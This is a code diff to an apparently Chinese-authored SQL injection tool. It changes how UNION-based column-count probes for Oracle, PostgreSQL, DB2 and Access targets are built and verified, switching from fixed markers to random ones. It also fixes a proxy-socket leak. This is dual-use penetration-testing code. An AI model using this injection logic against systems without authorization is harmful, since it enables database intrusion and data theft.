@@ -298,7 +298,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20190108;
+        public static int version = 20190110;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -6358,7 +6358,8 @@ namespace SuperSQLInjection
                                 if (errorServer.body.IndexOf(pals[1]) != -1)
                                 {
                                     this.txt_log.Invoke(new showLogDelegate(log), "发现" + pals[2], LogLevel.success);
-                                    selectDB(pals[3]);
+                                    currentDB = pals[3];
+                                    selectDB(currentDB);
                                     //标记注入
                                     selectInjectType(InjectType.Error);
                                     errorInject = true;
@@ -6439,9 +6440,10 @@ namespace SuperSQLInjection
                         {
                             break;
                         }
-                        int basestr = 1111111;
+                        String rand = Tools.RandNum(5);
+                        String charRand = Tools.strToChr(rand, "UTF-8", "||");
 
-                        String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, basestr + ""));
+                        String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, rand + ""));
 
                         if (DBType.Oracle.ToString().Equals(currentDB))
                         {
@@ -6451,10 +6453,10 @@ namespace SuperSQLInjection
                         {
                             //%16不能被URL编码
                             payload_request = request.Replace(strparam, payload_location + "%16");
-                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, basestr + "") + " from MSysAccessObjects");
+                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, rand + "") + " from MSysAccessObjects");
                         }
 
-                       
+                      
                         if (DBType.Oracle.ToString().Equals(currentDB)|| DBType.PostgreSQL.ToString().Equals(currentDB) || DBType.DB2.ToString().Equals(currentDB))
                         {
                             for (int j = 1; j <= i; j++)
@@ -6467,9 +6469,9 @@ namespace SuperSQLInjection
                                     //获得所有组合情况
                                     List<String> tp_list = Tools.getDB2UnionTemplates(i, j);
                                     foreach (String tp in tp_list) {
-                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByDB2(tp, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByDB2(tp, charRand));
                                         ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf("1111111111") != -1)
+                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf(rand) != -1)
                                         {
                                             isFind = true;
                                             newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>");
@@ -6486,16 +6488,16 @@ namespace SuperSQLInjection
                                 {
                                     if (DBType.Oracle.ToString().Equals(currentDB))
                                     {
-                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, charRand));
 
                                     }
 
                                     else if (DBType.PostgreSQL.ToString().Equals(currentDB))
                                     {
-                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, j, charRand));
                                     }
                                     ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                                    if (unionServer.code == 200 && unionServer.body.IndexOf("1111111111") != -1)
+                                    if (unionServer.code == 200 && unionServer.body.IndexOf(rand) != -1)
                                     {
                                         isFind = true;
                                         newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>");
@@ -6514,7 +6516,7 @@ namespace SuperSQLInjection
                             ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             for (int j = 1; j <= i; j++)
                             {
-                                String basecolumn = (basestr + j).ToString();
+                                String basecolumn = (Tools.convertToInt(rand) + j).ToString();
                                 if (unionServer.code == 200 && unionServer.body.IndexOf((basecolumn)) != -1)
                                 {
                                     isFind = true;
@@ -10075,6 +10077,7 @@ namespace SuperSQLInjection
                     if (client != null)
                     {
                         istrue = sp.ConnectProxyServer(config.proxy_check_host, config.proxy_check_port, client, proxy.username, proxy.password, config.timeOut);
+                        client.Close();
                         proxy.useTime = sp.ConectProxyUseTime;
                     }
                 }
